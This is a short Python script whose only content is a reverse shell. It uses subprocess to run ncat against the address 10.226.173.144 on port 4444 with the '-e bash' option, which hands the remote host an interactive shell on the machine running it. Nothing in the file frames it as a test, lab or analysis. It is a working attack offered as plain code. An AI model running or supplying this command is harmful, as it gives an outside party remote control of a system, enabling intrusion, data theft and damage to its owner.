import subprocess

# Define the command
command = ["ncat", "10.226.173.144", "4444", "-e", "bash"]

# Execute the command
try:
    subprocess.run(command, check=True)
except subprocess.CalledProcessError as e:
    print(f"Error: {e}")